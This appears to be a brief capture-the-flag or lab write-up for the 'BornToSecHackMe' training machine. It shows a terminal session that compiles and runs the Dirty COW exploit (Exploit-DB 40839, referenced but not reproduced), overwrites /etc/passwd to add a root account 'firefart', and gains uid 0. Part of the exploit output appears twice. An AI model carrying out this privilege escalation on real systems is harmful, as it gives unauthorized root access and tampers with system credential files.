First we log in as any user without root privilege

zaz@BornToSecHackMe:/tmp$ vim dirty.c
we copy the code from 40839.c

zaz@BornToSecHackMe:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
zaz@BornToSecHackMe:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fionu3giiS71.:0:0:pwned:/root:/bin/bash

mmap: b7fda000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password '1234'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
zaz@BornToSecHackMe:/tmp$
zaz@BornToSecHackMe:/tmp$ su firefart
Password:
firefart@BornToSecHackMe:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)